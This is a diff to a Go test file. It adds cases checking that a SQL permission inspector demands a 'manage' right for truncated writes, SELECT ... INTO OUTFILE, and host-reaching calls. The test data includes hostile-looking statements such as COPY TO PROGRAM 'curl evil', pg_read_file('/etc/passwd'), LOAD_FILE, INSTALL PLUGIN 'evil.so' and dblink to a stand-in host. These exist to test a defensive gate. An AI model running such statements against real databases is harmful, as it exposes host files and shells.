@@ -952,6 +952,45 @@ func TestPermissions_SQLiteStillReadsItsOwnUpsert(t *testing.T) {
 	}
 }
 
+// TestPermissions_ATruncatedWriteNeverRunsUnchecked pins the writes that name
+// no table because the statement stops before naming one. checkTables iterates
+// the tables a statement names, so a write naming none is checked against
+// nothing unless the inspector refuses it outright. Some of these also reach a
+// node error recovery leaves incomplete, where a dereference fails the request
+// rather than refusing the statement.
+func TestPermissions_ATruncatedWriteNeverRunsUnchecked(t *testing.T) {
+	nothing := core.Compile(nil).WithDenyUnmanaged()
+
+	for _, sql := range []string{
+		"DELETE",
+		"DELETE FROM",
+		"UPDATE",
+		"UPDATE SET c1 = 1",
+		"INSERT",
+		"INSERT INTO",
+	} {
+		for _, dialect := range BuiltinDialects() {
+			t.Run(dialect+": "+sql, func(t *testing.T) {
+				var inspected []core.InspectStatement
+				func() {
+					defer func() {
+						if r := recover(); r != nil {
+							t.Fatalf("inspecting panicked: %v", r)
+						}
+					}()
+					inspected = Inspect(GetDialect(dialect), permMeta(), sql)
+				}()
+				if len(inspected) == 0 {
+					t.Fatal("inspected to nothing: a caller reading this as an empty result runs it unchecked")
+				}
+				if err := core.CheckQueryPermissions(inspected, permDBID, nothing); err == nil {
+					t.Error("ran on a policy granting nothing")
+				}
+			})
+		}
+	}
+}
+
 // TestPermissions_SelectIntoIsNotJustASelect pins the two spellings that build
 // something while looking like a read. Both used to run holding select alone.
 func TestPermissions_SelectIntoIsNotJustASelect(t *testing.T) {
@@ -969,6 +1008,18 @@ func TestPermissions_SelectIntoIsNotJustASelect(t *testing.T) {
 		{"mysql", "SELECT c1 FROM t1 INTO OUTFILE '/tmp/x'", []string{core.ActionManage, core.ActionSelect}},
 		{"mysql", "SELECT c1 FROM t1 INTO DUMPFILE '/tmp/x'", []string{core.ActionManage, core.ActionSelect}},
 		{"mysql", "(SELECT c1 FROM t1) INTO OUTFILE '/tmp/x'", []string{core.ActionManage, core.ActionSelect}},
+		// One branch of a union carries it, and that branch is parenthesised,
+		// so walking the branches by shape missed it.
+		{"mysql", "(SELECT c1 FROM t1) UNION (SELECT c1 INTO OUTFILE '/tmp/x' FROM t1)", []string{core.ActionManage, core.ActionSelect}},
+		{"postgresql", "SELECT c1 INTO TEMPORARY t9 FROM t1", []string{core.ActionManage, core.ActionSelect}},
+		// A locking clause after the INTO is the spelling MySQL documents since
+		// 8.0.20. It raises a syntax error in this grammar and error recovery
+		// drops the tail, so there is no clause left in the tree to find.
+		{"mysql", "SELECT c1 FROM t1 FOR UPDATE INTO OUTFILE '/tmp/x'", []string{core.ActionManage, core.ActionSelect}},
+		{"mysql", "SELECT c1 FROM t1 LOCK IN SHARE MODE INTO OUTFILE '/tmp/x'", []string{core.ActionManage, core.ActionSelect}},
+		{"mysql", "SELECT c1 FROM t1 FOR UPDATE INTO DUMPFILE '/tmp/x'", []string{core.ActionManage, core.ActionSelect}},
+		// A locking clause on its own is still a plain read.
+		{"mysql", "SELECT c1 FROM t1 FOR UPDATE", []string{core.ActionSelect}},
 		// Writes nothing, so it stays a plain read.
 		{"mysql", "SELECT c1 INTO @v FROM t1", []string{core.ActionSelect}},
 	} {
@@ -986,6 +1037,171 @@ func TestPermissions_SelectIntoIsNotJustASelect(t *testing.T) {
 			}
 			if err := core.CheckQueryPermissions(inspected, permDBID, holding(tt.needs...)); err != nil {
 				t.Errorf("holding %v still refused it: %v", tt.needs, err)
+			}
+		})
+	}
+}
+
+// dialectSQL is one statement and the dialect it is written in.
+type dialectSQL struct {
+	dialect string
+	sql     string
+}
+
+// TestPermissions_ReachingTheServerNeedsManage pins the statements that touch
+// the host: its filesystem, its shell, another server. The four row actions
+// cover rows, so none of these may run on them. The database gates most of them
+// separately, on a superuser or the FILE privilege, which is a second gate and
+// not this one.
+func TestPermissions_ReachingTheServerNeedsManage(t *testing.T) {
+	dataActions := dataActionsOnly()
+
+	for _, tt := range []dialectSQL{
+		// Statement-shaped.
+		{"postgresql", "COPY t1 TO '/tmp/x.csv'"},
+		{"postgresql", "COPY t1 TO PROGRAM 'curl evil'"},
+		{"postgresql", "CREATE TABLESPACE ts LOCATION '/tmp/ts'"},
+		{"postgresql", "ALTER SYSTEM SET log_directory = '/tmp'"},
+		{"mysql", "LOAD DATA INFILE '/tmp/x' INTO TABLE t1"},
+		{"mysql", "LOAD XML INFILE '/tmp/x' INTO TABLE t1"},
+		{"mysql", "INSTALL PLUGIN x SONAME 'evil.so'"},
+		{"sqlite", "ATTACH DATABASE '/tmp/evil.db' AS e"},
+		{"sqlite", "VACUUM INTO '/tmp/x.db'"},
+
+		// Call-shaped, and these look like a plain read from the outside.
+		{"postgresql", "SELECT pg_read_file('/etc/passwd')"},
+		{"postgresql", "SELECT pg_ls_dir('/etc')"},
+		{"postgresql", "SELECT lo_export(1, '/tmp/x')"},
+		{"postgresql", "SELECT dblink_connect('host=evil')"},
+		{"postgresql", "SELECT * FROM t1 WHERE c2 = pg_read_file('/etc/passwd')"},
+		{"postgresql", "UPDATE t1 SET c2 = pg_read_file('/etc/passwd')"},
+		{"postgresql", "SELECT (SELECT pg_read_file('/etc/passwd'))"},
+		{"mysql", "SELECT LOAD_FILE('/etc/passwd')"},
+		{"mysql", "INSERT INTO t1 (c2) VALUES (LOAD_FILE('/etc/passwd'))"},
+		{"sqlite", "SELECT writefile('/tmp/x', 'data')"},
+		{"sqlite", "SELECT * FROM t1 WHERE c2 = readfile('/etc/passwd')"},
+		{"sqlite", "UPDATE t1 SET c2 = writefile('/tmp/x','y')"},
+	} {
+		t.Run(tt.dialect+": "+tt.sql, func(t *testing.T) {
+			inspected := Inspect(GetDialect(tt.dialect), permMeta(), tt.sql)
+			if len(inspected) == 0 {
+				t.Fatal("inspected to nothing: a caller reading this as an empty result runs it unchecked")
+			}
+			err := core.CheckQueryPermissions(inspected, permDBID, dataActions)
+			if err == nil {
+				t.Fatal("ran holding the four row actions")
+			}
+			if !strings.Contains(err.Error(), "manage") {
+				t.Errorf("refused for the wrong reason: %v", err)
+			}
+		})
+	}
+}
+
+// The name of one of those routines is not the call, so a column or an alias
+// spelled like one is still ordinary work.
+func TestPermissions_AHostFunctionNameIsNotACall(t *testing.T) {
+	dataActions := dataActionsOnly()
+
+	for _, tt := range []dialectSQL{
+		{"postgresql", "SELECT c1 AS pg_read_file FROM t1"},
+		{"postgresql", "SELECT c1 FROM t1 ORDER BY pg_read_file"},
+		{"mysql", "SELECT c1 AS load_file FROM t1"},
+		{"mysql", "SELECT c1 FROM t1 WHERE c2 = 'load_file('"},
+		{"mysql", "SELECT dumpfile FROM t1"},
+		{"mysql", "SELECT c1 FROM t1 ORDER BY dumpfile"},
+		{"sqlite", "SELECT c1 AS readfile FROM t1"},
+		{"sqlite", "SELECT c1 FROM t1 WHERE c2 = 'writefile'"},
+	} {
+		t.Run(tt.dialect+": "+tt.sql, func(t *testing.T) {
+			inspected := Inspect(GetDialect(tt.dialect), permMeta(), tt.sql)
+			if !testutil.Touches(inspected, testutil.Touch{Op: core.InspectOpSelect, Schema: "main", Name: "t1"}) {
+				t.Fatalf("no read of main.t1, so nothing here was checked: %+v", inspected)
+			}
+			if err := core.CheckQueryPermissions(inspected, permDBID, dataActions); err != nil {
+				t.Errorf("ordinary work refused: %v", err)
+			}
+		})
+	}
+}
+
+// A table may be named after one of those routines, and the parenthesis that
+// follows the name is then a column list. Reading it as a call costs the role
+// manage for an ordinary write.
+func TestPermissions_AHostFunctionNameIsAlsoATableName(t *testing.T) {
+	dataActions := dataActionsOnly()
+
+	for _, tt := range []struct {
+		dialect string
+		sql     string
+		touch   testutil.Touch
+	}{
+		{"postgresql", "INSERT INTO pg_read_file (c1) VALUES (1)",
+			testutil.Touch{Op: core.InspectOpInsert, Schema: "main", Name: "pg_read_file"}},
+		{"postgresql", "UPDATE pg_read_file SET c1 = 1",
+			testutil.Touch{Op: core.InspectOpUpdate, Schema: "main", Name: "pg_read_file"}},
+		{"postgresql", "SELECT * FROM (SELECT c1 FROM t1) AS pg_read_file (x)",
+			testutil.Touch{Op: core.InspectOpSelect, Schema: "main", Name: "t1"}},
+		{"mysql", "INSERT INTO load_file (c1) VALUES (1)",
+			testutil.Touch{Op: core.InspectOpInsert, Schema: "main", Name: "load_file"}},
+		{"sqlite", "INSERT INTO readfile (c1) VALUES (1)",
+			testutil.Touch{Op: core.InspectOpInsert, Schema: "main", Name: "readfile"}},
+	} {
+		t.Run(tt.dialect+": "+tt.sql, func(t *testing.T) {
+			inspected := Inspect(GetDialect(tt.dialect), permMeta(), tt.sql)
+			if !testutil.Touches(inspected, tt.touch) {
+				t.Fatalf("no %s on %s.%s, so nothing here was checked: %+v",
+					tt.touch.Op, tt.touch.Schema, tt.touch.Name, inspected)
+			}
+			if err := core.CheckQueryPermissions(inspected, permDBID, dataActions); err != nil {
+				t.Errorf("ordinary work refused: %v", err)
+			}
+		})
+	}
+}
+
+// Calling such a routine in one branch of a compound select classifies the
+// whole of it, since the branches are one statement.
+func TestPermissions_ACompoundSelectIsOneStatement(t *testing.T) {
+	sql := "SELECT c1 FROM t1 UNION SELECT readfile('/etc/passwd')"
+	inspected := Inspect(GetDialect("sqlite"), permMeta(), sql)
+	if len(inspected) == 0 {
+		t.Fatal("inspected to nothing: a caller reading this as an empty result runs it unchecked")
+	}
+	for _, stmt := range inspected {
+		if stmt.Operation != core.InspectOpUnknown {
+			t.Errorf("a branch of it reads as %s: %+v", stmt.Operation, inspected)
+		}
+	}
+	if err := core.CheckQueryPermissions(inspected, permDBID, dataActionsOnly()); err == nil {
+		t.Error("ran on the four row actions")
+	}
+}
+
+// One statement calling such a routine must not drag the rest of a script with
+// it, nor be excused by them.
+func TestPermissions_AScriptIsClassifiedStatementByStatement(t *testing.T) {
+	dataActions := dataActionsOnly()
+
+	for _, tt := range []dialectSQL{
+		{"postgresql", "SELECT pg_read_file('/etc/passwd'); SELECT c1 FROM t1"},
+		{"mysql", "SELECT LOAD_FILE('/etc/passwd'); SELECT c1 FROM t1"},
+		{"sqlite", "SELECT readfile('/etc/passwd'); SELECT c1 FROM t1"},
+		{"sqlite", "SELECT c1 FROM t1; SELECT readfile('/etc/passwd')"},
+	} {
+		t.Run(tt.dialect+": "+tt.sql, func(t *testing.T) {
+			inspected := Inspect(GetDialect(tt.dialect), permMeta(), tt.sql)
+			unknown := 0
+			for _, stmt := range inspected {
+				if stmt.Operation == core.InspectOpUnknown {
+					unknown++
+				}
+			}
+			if unknown != 1 {
+				t.Errorf("%d statements need manage, want 1: %+v", unknown, inspected)
+			}
+			if err := core.CheckQueryPermissions(inspected, permDBID, dataActions); err == nil {
+				t.Error("the calling statement ran on the four row actions")
 			}
 		})
 	}
